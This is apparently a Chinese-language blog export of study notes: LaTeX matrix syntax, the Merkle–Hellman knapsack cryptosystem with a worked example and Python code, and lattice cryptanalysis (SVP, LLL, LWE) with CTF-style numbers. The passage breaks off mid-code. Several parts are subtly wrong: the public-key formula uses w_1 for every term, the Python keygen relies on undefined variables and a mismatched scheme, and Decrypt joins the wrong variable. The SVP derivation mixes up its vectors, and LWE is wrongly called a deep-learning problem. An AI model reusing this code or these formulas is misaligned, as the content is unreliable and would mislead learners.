<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\left</span><span class="keyword">\&#123;</span></span><br><span class="line"><span class="keyword">\begin</span>&#123;matrix&#125;</span><br><span class="line">  1 <span class="built_in">&amp;</span> 2 <span class="built_in">&amp;</span> 3 <span class="keyword">\\</span></span><br><span class="line">  4 <span class="built_in">&amp;</span> 5 <span class="built_in">&amp;</span> 6 <span class="keyword">\\</span></span><br><span class="line">  7 <span class="built_in">&amp;</span> 8 <span class="built_in">&amp;</span> 9</span><br><span class="line"><span class="keyword">\end</span>&#123;matrix&#125;</span><br><span class="line"><span class="keyword">\right</span><span class="keyword">\&#125;</span></span><br><span class="line"><span class="keyword">\left</span>[</span><br><span class="line"><span class="keyword">\begin</span>&#123;matrix&#125;</span><br><span class="line">  1 <span class="built_in">&amp;</span> <span class="keyword">\cdots</span> <span class="built_in">&amp;</span> n<span class="built_in">_</span>1 <span class="keyword">\\</span></span><br><span class="line">  <span class="keyword">\vdots</span> <span class="built_in">&amp;</span> <span class="keyword">\ddots</span> <span class="built_in">&amp;</span> <span class="keyword">\vdots</span> <span class="keyword">\\</span></span><br><span class="line">  m <span class="built_in">&amp;</span> <span class="keyword">\cdots</span> <span class="built_in">&amp;</span> n<span class="built_in">_</span>m</span><br><span class="line"><span class="keyword">\end</span>&#123;matrix&#125;</span><br><span class="line"><span class="keyword">\right</span>]</span><br><span class="line"><span class="keyword">\begin</span>&#123;pmatrix&#125;</span><br><span class="line">  1 <span class="built_in">&amp;</span> 2 <span class="built_in">&amp;</span> 3 <span class="keyword">\\</span></span><br><span class="line">  4 <span class="built_in">&amp;</span> 5 <span class="built_in">&amp;</span> 6 <span class="keyword">\\</span></span><br><span class="line">  7 <span class="built_in">&amp;</span> 8 <span class="built_in">&amp;</span> 9</span><br><span class="line"><span class="keyword">\end</span>&#123;pmatrix&#125;</span><br><span class="line"><span class="keyword">\left</span>|</span><br><span class="line"><span class="keyword">\begin</span>&#123;matrix&#125;</span><br><span class="line">1 <span class="built_in">&amp;</span> 2 <span class="built_in">&amp;</span> 3 <span class="keyword">\\</span></span><br><span class="line">4 <span class="built_in">&amp;</span> 5 <span class="built_in">&amp;</span> 6 <span class="keyword">\\</span></span><br><span class="line">7 <span class="built_in">&amp;</span> 8 <span class="built_in">&amp;</span> 9</span><br><span class="line"><span class="keyword">\end</span>&#123;matrix&#125;</span><br><span class="line"><span class="keyword">\right</span>|</span><br></pre></td></tr></table></figure>
<p><span class="math display">\[
\left\{
\begin{matrix}
  1 &amp; 2 &amp; 3 \\
  4 &amp; 5 &amp; 6 \\
  7 &amp; 8 &amp; 9
\end{matrix}
\right\}
\left[
\begin{matrix}
  1 &amp; \cdots &amp; n_1 \\
  \vdots &amp; \ddots &amp; \vdots \\
  m &amp; \cdots &amp; n_m
\end{matrix}
\right]
\left(
\begin{matrix}
  1 &amp; 2 &amp; 3 \\
  4 &amp; 5 &amp; 6 \\
  7 &amp; 8 &amp; 9
\end{matrix}
\right)
\left|
\begin{matrix}
1 &amp; 2 &amp; 3 \\
4 &amp; 5 &amp; 6 \\
7 &amp; 8 &amp; 9
\end{matrix}
\right|
\]</span></p>
<p><strong>增广矩阵</strong>需要使用特殊的写法，即使用
<code>\begin&#123;array&#125;&#123;cc|c&#125;</code> 和 <code>\end&#123;array&#125;</code>
包含矩阵内容，其中 <code>c</code> 为占位符：</p>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\left</span>[</span><br><span class="line"><span class="keyword">\begin</span>&#123;array&#125;&#123;cc|c&#125;</span><br><span class="line">  1 <span class="built_in">&amp;</span> 2 <span class="built_in">&amp;</span> 3 <span class="keyword">\\</span></span><br><span class="line">  4 <span class="built_in">&amp;</span> 5 <span class="built_in">&amp;</span> 6 <span class="keyword">\\</span></span><br><span class="line">  7 <span class="built_in">&amp;</span> 8 <span class="built_in">&amp;</span> 9</span><br><span class="line"><span class="keyword">\end</span>&#123;array&#125;</span><br><span class="line"><span class="keyword">\right</span>]</span><br></pre></td></tr></table></figure>
<p>效果如下 <span class="math display">\[
\left[
\begin{array}{cc|c}
  1 &amp; 2 &amp; 3 \\
  4 &amp; 5 &amp; 6 \\
  7 &amp; 8 &amp; 9
\end{array}
\right]
\]</span></p>
<h2 id="方程组">方程组</h2>
<p>使用 <code>\begin&#123;cases&#125;</code> 与 <code>\end&#123;cases&#125;</code>
包含，使用 <code>\\</code> 进行换行</p>
<figure class="highlight latex"><table><tr><td class="code"><pre><span class="line"><span class="keyword">\begin</span>&#123;cases&#125;</span><br><span class="line">x<span class="keyword">\equiv</span> a<span class="built_in">_</span>1<span class="keyword">\pmod</span>&#123;m<span class="built_in">_</span>1&#125;<span class="keyword">\\</span></span><br><span class="line">x<span class="keyword">\equiv</span> a<span class="built_in">_</span>2<span class="keyword">\pmod</span>&#123;m<span class="built_in">_</span>2&#125;<span class="keyword">\\</span></span><br><span class="line"><span class="keyword">\cdots</span><span class="keyword">\\</span></span><br><span class="line">x<span class="keyword">\equiv</span> a<span class="built_in">_</span>n<span class="keyword">\pmod</span>&#123;m<span class="built_in">_</span>n&#125;</span><br><span class="line"><span class="keyword">\end</span>&#123;cases&#125;</span><br></pre></td></tr></table></figure>
<p>效果如下 <span class="math display">\[
\begin{cases}
x\equiv a_1\pmod{m_1}\\
x\equiv a_2\pmod{m_2}\\
\cdots\\
x\equiv a_n\pmod{m_n}
\end{cases}
\]</span></p>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>math</tag>
        <tag>latex</tag>
      </tags>
  </entry>
  <entry>
    <title>knapsack背包密码算法</title>
    <url>//knapsack-note.html</url>
    <content><![CDATA[<h1 id="knapsack-算法">Knapsack 算法</h1>
<h2 id="简述">简述</h2>
<p>Merkle–Hellman 背包密码系统是最早的之一公钥密码系统，同时也被称作
Knapsack 密码，在 1984 年便被破解，由阿迪·沙米尔（Adi
Shamir）提出多项式时间攻击，故该密码为不安全的密码系统。</p>
<p>Merkle-Hellman
是一个公共密钥密码系统，这意味着使用了两个密钥，一个用于加密的公钥和一个用于解密的私钥。它基于子集和问题（背包问题），问题如下：</p>
<blockquote>
<p>给定一组整数 <span class="math inline">\(A\)</span> 和一个整数 <span class="math inline">\(c\)</span>，找到的子集 <span class="math inline">\(A\)</span> 总计 <span class="math inline">\(c\)</span>。通常，已知此问题是 NP 完全
。但是，如果 <span class="math inline">\(A\)</span> 是超增
，这意味着集合中的每个元素都大于集合中所有数字的总和，那么问题是“容易的”并且可以通过简单的方法在多项式时间内解决，即使用贪心算法.</p>
</blockquote>
<p>在 Merkle-Hellman
中，解密消息需要解决一个看似“硬”的背包问题。私钥包含数字的递增列表 <span class="math inline">\(W\)</span>，并且公钥包含数字的非超级列表 <span class="math inline">\(B\)</span>，实际上是“伪装”的 <span class="math inline">\(W\)</span>。私钥还包含一些“活板门”信息，这些信息可用于转换使用以下内容的硬背包问题
<span class="math inline">\(B\)</span> 使用一个简单的背包问题 <span class="math inline">\(W\)</span>。</p>
<h2 id="密钥生成">密钥生成</h2>
<ol type="1">
<li><p>选择块大小 <span class="math inline">\(n\)</span></p></li>
<li><p>选择一个随机的超增正序列 <span class="math inline">\(W=(w_1,w_2,\cdots,w_n)\)</span>，其中超增意味着需要满足：
<span class="math display">\[
w_k&gt;\sum^{k-1}_{i=1}w_i,k\in(1,n],k\in N
\]</span></p></li>
<li><p>选择一个随机整数 <span class="math inline">\(q\)</span>，满足
<span class="math display">\[
q&gt;\sum^{n}_{i=1}w_i
\]</span></p></li>
<li><p>随机选择一个随机整数 <span class="math inline">\(r\)</span>，满足
<span class="math inline">\(\gcd(r,q)=1\)</span>，即 <span class="math inline">\(r\)</span> 与 <span class="math inline">\(q\)</span> 互质</p></li>
<li><p>计算序列 <span class="math inline">\(B=(b_1,b_2,\cdots,b_n)\)</span>，其中 <span class="math display">\[
b_i=rw_1\pmod{q}
\]</span></p></li>
</ol>
<p>公钥即为 <span class="math inline">\(B\)</span>，私钥为 <span class="math inline">\((W,q,r)\)</span></p>
<h2 id="加密">加密</h2>
<ol type="1">
<li><p>将明文 <span class="math inline">\(m\)</span> 二进制编码为序列
<span class="math inline">\(M=(m_1,m_2,\cdots,m_n)\)</span>，例如明文 5
编码为序列 <span class="math inline">\(M=(1,0,1)\)</span></p></li>
<li><p>计算密文 <span class="math display">\[
c=\sum^{n}_{i=1}m_ib_i
\]</span></p></li>
</ol>
<h2 id="解密">解密</h2>
<p>我们将问题转化为寻找 <span class="math inline">\(W\)</span>，使用贪心算法便可在多项式时间内求解。</p>
<ol type="1">
<li><p>计算模逆 <span class="math inline">\(F_r=r^{-1}\pmod{q}\)</span>（由于之前满足 <span class="math inline">\(\gcd(r,q)=1\)</span>，故模逆必存在）</p></li>
<li><p>计算 <span class="math inline">\(c&#39;=cF_r\pmod{q}\)</span></p></li>
<li><p>贪婪选取 <span class="math inline">\(X=(x_1,x_2,\cdots,x_n)\)</span>，使得满足 <span class="math display">\[
c&#39;=\sum^{k}_{i=1}w_{x_i}
\]</span></p></li>
<li><p>最后将序列 <span class="math inline">\(X\)</span> 二进制解码回
<span class="math inline">\(m\)</span> 即可</p></li>
</ol>
<h2 id="实例">实例</h2>
<h3 id="密钥生成-1">密钥生成</h3>
<p>生成超增序列 <span class="math inline">\(W=(2,7,11,21,42,89,180,354),q=881,r=588\)</span></p>
<p>构造公钥 <span class="math display">\[
2\times588\pmod{881}=295\\
7\times588\pmod{881}=592\\
11\times588\pmod{881}=301\\
21\times588\pmod{881}=14\\
42\times588\pmod{881}=28\\
89\times588\pmod{881}=353\\
180\times588\pmod{881}=120\\
354\times588\pmod{881}=236
\]</span> 故公钥为 <span class="math inline">\(B=(295,592,301,14,28,353,120,236)\)</span></p>
<h3 id="加密-1">加密</h3>
<p>消息 <span class="math inline">\(m=97\)</span>，二进制编码得到序列
<span class="math inline">\(M=(0,1,1,0,0,0,0,1)\)</span></p>
<p>序列相乘 <span class="math display">\[
M\cdot
B=0\times295+1\times592+1\times301+0\times14+0\times28+0\times353+0\times120+1\times236=1129
\]</span> 故密文即为 <span class="math inline">\(c=1129\)</span></p>
<h3 id="解密-1">解密</h3>
<p>计算模逆 <span class="math inline">\(F_r=r^{-1}\pmod{q}=442\)</span></p>
<p>计算 <span class="math inline">\(c&#39;=cF_r\pmod{q}=372\)</span></p>
<p>使用贪婪算法求解步骤： <span class="math display">\[
c&#39;=372,w_8=354\le372\Rightarrow x_8=1\\
c&#39;=372-354=18,w_3=11\le18\Rightarrow x_3=1\\
c&#39;=18-11=7,w_2=7\le7\Rightarrow x_2=1\\
c&#39;=7-7=0
\]</span> 故我们得到序列 <span class="math inline">\(X=(0,1,1,0,0,0,0,1)\)</span></p>
<p>故二进制解码得到明文 <span class="math inline">\(m=97\)</span></p>
<h2 id="安全性">安全性</h2>
<p>背包密码系统的安全性依赖于一般背包问题的求解困难（已知公钥求解困难），而超增背包问题的求解简单（已知私钥求解容易）。</p>
<h2 id="python-实现">Python 实现</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">keygen</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    密钥生成</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    pk=[]</span><br><span class="line">    sk=[]</span><br><span class="line">    sk.append(m)</span><br><span class="line">    sk.append(<span class="built_in">int</span>(gmpy2.invert(w,m)))</span><br><span class="line">    D=[]</span><br><span class="line">    binD=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        di=(w*Bag[i])%m</span><br><span class="line">        D.append(di)</span><br><span class="line">        bindi=<span class="built_in">bin</span>(di)[<span class="number">2</span>:]</span><br><span class="line">        bindi=pad(bindi,h)</span><br><span class="line">        binD.append(bindi)</span><br><span class="line">    U=[]</span><br><span class="line">    V=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        tempu=<span class="built_in">int</span>(<span class="built_in">str</span>(binD[i][:j]),<span class="number">2</span>)</span><br><span class="line">        U.append(tempu)</span><br><span class="line">        tempv=<span class="built_in">int</span>(<span class="built_in">str</span>(binD[i][j:]),<span class="number">2</span>)</span><br><span class="line">        V.append(tempv)</span><br><span class="line">    e=gmpy2.next_prime(<span class="built_in">sum</span>(V))+<span class="number">2</span></span><br><span class="line">    f=gmpy2.next_prime(<span class="built_in">sum</span>(U))</span><br><span class="line">    <span class="keyword">assert</span> gmpy2.gcd(e,f)==<span class="number">1</span></span><br><span class="line">    sk.append(<span class="built_in">int</span>(e))</span><br><span class="line">    sk.append(<span class="built_in">int</span>(f))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        ai=e*U[i]+f*V[i]</span><br><span class="line">        pk.append(<span class="built_in">int</span>(ai))</span><br><span class="line">    <span class="keyword">return</span> pk, sk</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">plain,pk</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    加密</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    mbin=<span class="built_in">bin</span>(plain)[<span class="number">2</span>:]</span><br><span class="line">    c=<span class="number">0</span></span><br><span class="line">    mbin=pad(mbin,Baglenth)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(Baglenth):</span><br><span class="line">        c=c+<span class="built_in">int</span>(mbin[i])*pk[i]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">code, sk, q, r</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    解密</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    code = code * <span class="built_in">pow</span>(r, -<span class="number">1</span>, q) % q</span><br><span class="line">    mbin = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sk[::-<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">if</span> i &gt; code:</span><br><span class="line">            mbin.append(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            mbin.append(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            code -= i</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(code[::-<span class="number">1</span>]), <span class="number">2</span>)</span><br></pre></td></tr></table></figure>
<h1 id="knapsack-破解">Knapsack 破解</h1>
]]></content>
  </entry>
  <entry>
    <title>格密码相关笔记</title>
    <url>//lattice-note.html</url>
    <content><![CDATA[<h1 id="格简介lattice">格简介(Lattice)</h1>
<p>给定一组线性无关的基向量 (basis) <span class="math inline">\((v_1,v_2,\cdots,v_n)\)</span>，这些基向量的线性组合
(linear combinations) 为： <span class="math display">\[
a_1v_1+a_2v_2+\cdots+a_nv_n,a_i\in R
\]</span> 而这些线性组合所组成的集合，称作这组基向量所张成的空间
(span)。</p>
<p>例如我们在二维平面中选取两个单位正交向量作为基向量： <span class="math display">\[
i=(1,0),j=(0,1)
\]</span> 那么由这两组基向量组成的所有可能的线性组合为： <span class="math display">\[
a\cdot i+b\cdot j=(a,b)
\]</span> 其中 <span class="math inline">\(a,b\in
R\)</span>，其所张成的空间便是整个二维平面。</p>
<figure>
<img src="/lattice-note/二维平面.png" alt="二维平面">
<figcaption aria-hidden="true">二维平面</figcaption>
</figure>
<p>反过来，在这个二维平面上的任意一点都可以由这两个基向量的一个线性组合表示：</p>
<figure>
<img src="/lattice-note/二维平面上一个线性组合.png" alt="二维平面上一个线性组合">
<figcaption aria-hidden="true">二维平面上一个线性组合</figcaption>
</figure>
<p>而格，就是这些基向量的所有<strong>整系数</strong>的线性组合： <span class="math display">\[
a_1v_1+a_2v_2+\cdots+a_nv_n,a_i\in Z
\]</span> 这些线性组合所形成的集合就叫做这组基向量所张成的格
(lattice)。</p>
<p>当系数不是实数而是任意整数的时候，其所张成的线性空间从无数个<strong>连续</strong>的点变成了无数个<strong>离散</strong>的点。</p>
<figure>
<img src="/lattice-note/正交基向量张成的格.png" alt="正交基向量张成的格">
<figcaption aria-hidden="true">正交基向量张成的格</figcaption>
</figure>
<p>当基向量发生改变时，其所张成的格也会发生改变：</p>
<figure>
<img src="/lattice-note/不同基向量张成的格.png" alt="不同基向量张成的格">
<figcaption aria-hidden="true">不同基向量张成的格</figcaption>
</figure>
<p>如果对原基底进行<strong>整系数线性变换</strong>，得到的<strong>新基底</strong>所张成的格仍旧不变：</p>
<figure>
<img src="/lattice-note/相同的格.png" alt="相同的格">
<figcaption aria-hidden="true">相同的格</figcaption>
</figure>
<p>所以我们可以发现，就算是同一个格，也可以有很多组基底。</p>
<p>而在格学说里，有两个知名难题：</p>
<ul>
<li>SVP (最短向量问题，Shortest Vector
Problem)：给定lattice和基向量，找到lattice中的一个长度最短的非零向量。</li>
<li>CVP (最近向量问题，Closest Vector
Problem)：给定lattice和基向量，以及一个不在lattice上的目标向量，找到lattice中一个距离目标向量最近的格向量。</li>
</ul>
<p>在广义上这两大难题被证明是 <code>NP-hard</code> 问题。</p>
<blockquote>
<p>小格可以使用 Sagemath 的 <code>LLL</code> 算法求解格规约，但大格可能
Sagemath 提供的算法效率不够，这个时候可以借助 <code>flatter</code>
库进行格规约计算。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">M = matrix(ZZ, [(<span class="number">66586820</span>,<span class="number">65354729</span>),(<span class="number">6513996</span>,<span class="number">6393464</span>)])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flatter</span>(<span class="params">M</span>):</span><br><span class="line">    <span class="keyword">from</span> subprocess <span class="keyword">import</span> check_output</span><br><span class="line">    <span class="keyword">import</span> re</span><br><span class="line">    inputM = <span class="string">&quot;[[&quot;</span> + <span class="string">&quot;]\n[&quot;</span>.join(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, row)) <span class="keyword">for</span> row <span class="keyword">in</span> M) + <span class="string">&quot;]]&quot;</span></span><br><span class="line">    outputM = check_output([<span class="string">&quot;flatter&quot;</span>], <span class="built_in">input</span>=inputM.encode())</span><br><span class="line">    <span class="keyword">return</span> matrix(M.nrows(), M.ncols(), <span class="built_in">map</span>(<span class="built_in">int</span>, findall(<span class="string">b&quot;-?\\d+&quot;</span>, outputM)))</span><br><span class="line">flatter(M)</span><br></pre></td></tr></table></figure>
</blockquote>
<h1 id="svp-问题">SVP 问题</h1>
<p>虽然说 SVP 是 <code>NP-hard</code> 问题，但当维度较低时，存在 LLL
算法可以在多项式时间内求解 SVP 问题。</p>
<p>SVP 问题可以简化成如下表达式： <span class="math display">\[
f\cdot h\equiv g\pmod{p}
\]</span> 其中所有变量都为整数，<span class="math inline">\((h,p)\)</span> 为已知向量，此时需要满足 <span class="math inline">\(||(f,g)||\)</span>
的长度较小，使得该向量为这个格的最短向量，即可转换为 SVP 问题求解 <span class="math inline">\((f,p)\)</span> 向量。</p>
<p>我们构造矩阵 <span class="math inline">\(M\)</span> 为： <span class="math display">\[
M=\begin{bmatrix}
1&amp;h\\
0&amp;p
\end{bmatrix}
\]</span></p>
<blockquote>
<p>证明：向量 <span class="math inline">\((f,g)\)</span>
是在该格上。</p>
<p>首先将同余式变形为 <span class="math display">\[
f\cdot h\equiv g+k\cdot p
\]</span> 即 <span class="math display">\[
f\cdot h-k\cdot p\equiv g
\]</span> 我们可以发现 <span class="math display">\[
\begin{align*}
(f,-k)\cdot M&amp;=(f,-k)\begin{bmatrix}
1&amp;h\\
0&amp;p
\end{bmatrix}\\
&amp;=(f+0,f\cdot h+(-k)\cdot p)\\
&amp;=(f,f\cdot h-k\cdot p)\\
&amp;=(f,g)
\end{align*}
\]</span> 向量 <span class="math inline">\((f,g)\)</span> 可以由基向量
<span class="math inline">\(M\)</span> 的某种整系数线性组合 <span class="math inline">\((f, -u)\)</span> 来表示，因此向量 <span class="math inline">\((f,g)\)</span> 就在这个格上。</p>
</blockquote>
<p>之后我们只需要使用 LLL 算法即可。</p>
<p>一个可能的代码示例（使用 Sagemath）：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">M = matrix(ZZ, [(<span class="number">66586820</span>,<span class="number">65354729</span>),(<span class="number">6513996</span>,<span class="number">6393464</span>)])</span><br><span class="line">shortest_vector = M.LLL()[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
<h1 id="lwe-问题">LWE 问题</h1>
<h2 id="原理">原理</h2>
<p>LWE 问题，即 Learning-with-errors 问题，针对的是形如 <span class="math display">\[
\boldsymbol{S}=\boldsymbol{R}\cdot x+\boldsymbol{E}
\]</span> 的方程组，即 <span class="math display">\[
\begin{cases}
s_1=r_1\cdot x+e_1\\
s_2=r_2\cdot x+e_2\\
\ \ \ \ \ \ \vdots\\
s_n=r_n\cdot x+e_n\\
\end{cases}
\]</span> 其中 <span class="math inline">\(e_i\)</span>
我们称作误差（error），是未知量，而 <span class="math inline">\(r_i,s_i\)</span> 为已知量，对这个方程组求解 <span class="math inline">\(x\)</span> 即 LWE 问题。</p>
<p>这在深度学习领域是一个重要问题，即每次的输入和输出有一定的误差存在，要如何根据输出求解输入。</p>
<h2 id="代码">代码</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = <span class="number">6897108443075981744484758716081045417854227543713106404294789655180105457499042179717447342593790180943415014044830872925165163457476209819356694244840079</span></span><br><span class="line">rs = [<span class="number">12844634549263053228759749264403637022740290008286987401585068952741935277415527678380021212624846722242500708422759563558995936977274580301379494195702461</span>, <span class="number">12251634003683452916928102291170339939586644029776192301741341674585154859358419625191986830852794085541953563738986709807899575511700135958334229151930861</span>, <span class="number">7051370666077542197248638013011793824477073777322219545882367881807130066168444134964571398112151848834032654978368255218649720738040945429837692857031957</span>, <span class="number">9773046862351952930368505593284546267554571295872377323111558071278701231472975791962979256551519533723988556870551885073742407630481198192389750289392107</span>, <span class="number">8883776497660138308720006912582738672888752344326928153810910221453595077711284302041512529457450211602787210761461172326429880594024187025419873043435877</span>, <span class="number">12056735137145460036580841038332100311160368843873164649606343042416896898793233249873902218683966283969721460087390120622254758027779960740926123005377571</span>, <span class="number">8819958747150954554494406068232243249186433676383469322817152210037563032056202909377825740775383087605647374150477096718956454225946093710691864988563109</span>, <span class="number">12246023449098354751049599873213988024512286270964608502444597112110163392131757813461977030270733012385926751192637938686124570227538910606279104888073013</span>, <span class="number">11308837998867241929817950595621831002334468993828126438599805989088017326675963100044309448653090403889186401929445861220402556074702741108929442867300279</span>, <span class="number">9184622887414209361516593101129556569811888214607556630094969763910426953786020755838094184972397480276666170685926425137063559394969166216392939257091541</span>, <span class="number">12896400069515890897430087815982545671830645201023665112429779640768899091287291452408369445919464144390726200808875066389240126909811239597092893733457339</span>, <span class="number">11227025698697471809912850435140886785315702278826761054472525227951791647003561270585720797267604996360933395122286757099101227901032364782594523739698877</span>, <span class="number">8162123490656317490361880020667919072708091053716891870691544217490126444997503404094174246087938828993696335191488583306443577208796794274099282013427247</span>, <span class="number">13366989889442670291461262313757977600095962057470863475519088648267301129719953368943419562144276679400967122727554764013132918505564677243979978807323041</span>, <span class="number">9920857455945408588203972193444437533164351309299040911469275059092031755811492460585653948481522995557801781838215407648572999358456612525812067538372579</span>, <span class="number">7139402473546047825312503780125417567716958846513076797328672521987900978293260385267945187604725349720103672258987935569856239987227455748213833342843243</span>, <span class="number">13108142660294572752252393081421368493392921884487755391460006730258159004638343897340537616297811742032405724656497443006056456690449881719305597286675631</span>, <span class="number">13276762958403786077380090195631980415297280849950287990717193547481553124160398455403123819234755237450529090601858784999113026218918277529515287668651121</span>, <span class="number">12463094640052886550696551772104539361264529587569204472038955376345085195998921095774583176899949596998985033050547755235409943131811058035802010421860899</span>, <span class="number">11307743131694864808301935844724645695851330736969875190167422024500753079857478680029193758960169072890576310607053767920339034290416580654771095674487943</span>, <span class="number">10053742503547378455068966704402695956702795408343604912294923217443553169726438945982031485796964462946592530592946335569560364464958066521486506177193131</span>, <span class="number">9703695763451799125258961776229325510814289358679213305418559381901496449849584244211834872313767844996255556721041007654625153809128987422992102292472533</span>, <span class="number">8148189465927721940294369879439913703690047528695196368949823197675716174991296513758196009346701553643721225250628151384047219921709201619262393792138023</span>, <span class="number">9114150910964237818418367840207724528917302406836157928223872622442928604249864486858755737149640683259834299165900696585038569188627682022002709058902291</span>, <span class="number">12273514376180781903469287345188404399033432117915094289694407562166649079228640510678711431664410226301556172582177240184695103942141430877677144285616059</span>, <span class="number">8355005721684425514882933910286584148305344580589623112959517428993968438533866906223777778058096962333203237111245328436600994120168924143849685728268811</span>, <span class="number">8957883838807471492147480816683526636019698464133185237668243268667169800811696770484487123560197988448434475112352005768286417529319182162245840523697001</span>, <span class="number">12168542584724814356632409768687396920143300559579648963851924568387314914334359305942685551210180448419674060219496395116081866784918059237133414041227833</span>, <span class="number">12285935007930825571672128346804313607196190465690759870758278705086034778808662886056460827935986285259185071514490942831585313190946386878622608868345563</span>, <span class="number">7719913817859572377164973343651155934060296607908537845256755472465025202751239980758950094865067751407889569369974011139801401586939119147773466111699913</span>]</span><br><span class="line">cs = [<span class="number">3911325901261770731066343727353093385607196883601022244426857460074338420692610012414571623512152485474248169220030587839849722757773859682519433853455847</span>, <span class="number">4198555117325325874584019691418573071733167640213933749582347442518997588452211673143722179281773602455507001395983681009769848414007206268682184816168744</span>, <span class="number">4422173666634983234895098798813962037875417568235708524339826709271381748884936178371767574064794177416615710120223914725873239836121654705208614576413533</span>, <span class="number">3540260422555697887869627546208164711550015909378340105077652177481959576550678379723450981807556863572610759824660630418670546203733170058626755080797998</span>, <span class="number">6451498467498935201092514865627931677091078787997097414208430992183264950579022373372254486595458117887305393317663712337699331503725124287017134808484874</span>, <span class="number">3439629581963524351810430910737336124616316641656190641248434504621774235943514617301857917041111617104850245148746427180069743940612560718213177903427306</span>, <span class="number">4279468191481832212496939242093486044278976937965085475567008228061184947513156012369586970486543083130565628906296600553024574099481246534878242920637212</span>, <span class="number">4102135455518061133919027670571325279976222647984452353051395864554309521223498761823084717077102213648612826513661629599971609555235760152049549057234342</span>, <span class="number">329051927890365028889097463563711966673066795688728876214731188783168691555262156515161429328581094087585127929869064685419149676592073496155898360311360</span>, <span class="number">1674347209896897571502352451063188834938904430329951752111921115230349947823188121972980025563878887201507629419811736910690965020923751424101521816057970</span>, <span class="number">4779084317811375050159574994746297486592271247137823471375199626788956576998627181220489952507937768042501203098391966702297812537463211799837921684467541</span>, <span class="number">5240331815784322792144549873873658636726233093228415489098002982220769676718681132737794994708716389174162820721646744776624413735318240597745363490427584</span>, <span class="number">2689716894922604875455207695253665212853470308341743040957367957727155614199743562225147359614514189877983156892749669804800163252617480446565479990148021</span>, <span class="number">449708769594599088851244243076921016853502252396793496349534051273454215985560340288452398756880916680293627457774430655982228613348249480600180821975835</span>, <span class="number">1584603978331289335352997151059666773277943458357161051278658090420067023680231414255557805410288144092653121568766136372728095300982743309696347031121424</span>, <span class="number">4874260053151700374809337053763032489184725334196495160358275038586824027920238733886703163018450814805937363825223459277373073591021082276610135118976834</span>, <span class="number">3524374131362906900545297291947110177298862564718451821839794960169356082042548386553363480921097452902723033854749443288682983558847052843293666815425196</span>, <span class="number">6544123591499569232021913370293570477776709315008783531720886545784773471486769240711262562401683145937715612435213816372680189321141928790509490282629891</span>, <span class="number">4873861166228118967099569086478548167127431415017791678812419676791754466935832034870862000658789609084166891933970013849850146718379819943737269970654866</span>, <span class="number">4100817874436703071716655163972145036104985973164830547825929590871920825981241934633977227547934514142660786061291026657802357404024236287955309372489516</span>, <span class="number">343238276681348130286495167739162902430650061145485619903964358840996341335935043000395056684771452815629410388891486531126938900311458948803147120186532</span>, <span class="number">2683710724350412998770392318832434885304538325033159937379489319924346689197445720734209841902612235485016866254994045969716413020197296428323832404151182</span>, <span class="number">5909464641105704179999104311562416363090166762341644691188169716182958971270396007422581429813172933930581475771306034495224054972725230757675444731953480</span>, <span class="number">105593489999747649490909471306354863316673821363863362258853043970534652401274789197677558215188249074837829003335733211890211648501689656345824858507373</span>, <span class="number">4992379366542645691375959247465888889778118153982142100956809440855745659745235576280578316185469306620017845690312554043770651058126536040173113949524396</span>, <span class="number">6533456398244789907636779407045515567135195474284185379689518387558345997627435421582437390053234675991361808532278264077968540197407743744279106871716267</span>, <span class="number">5169360398767270275853790242315213671633880428212603766301308853363063092609582572957561138022806887895634140899640025570759919257615537375706008159680239</span>, <span class="number">203310740924699994885931266978520636166917734618272844754878785050509801614513144739164450834936178065792112797202959106365282699245578309060905297742706</span>, <span class="number">3143563289239398127009575193211845399079310618985464994769603542400451633289266080869317336163844517539211542909055869608349639432145332113320465388067087</span>, <span class="number">4016252180207572047405081190649590978593306403200098541033213590567723751195926093369984531729148621419589009515870336049849542537363832071754623330736088</span>]</span><br><span class="line">enc = <span class="number">1315637864146686255246675143589215932218700984880749264689270214639479160648747323586062096067740047809798944996253169402675772469028914904598116394230426</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#脚本1-小规模</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"></span><br><span class="line">row = <span class="number">30</span></span><br><span class="line">column = <span class="number">30</span></span><br><span class="line">prime = 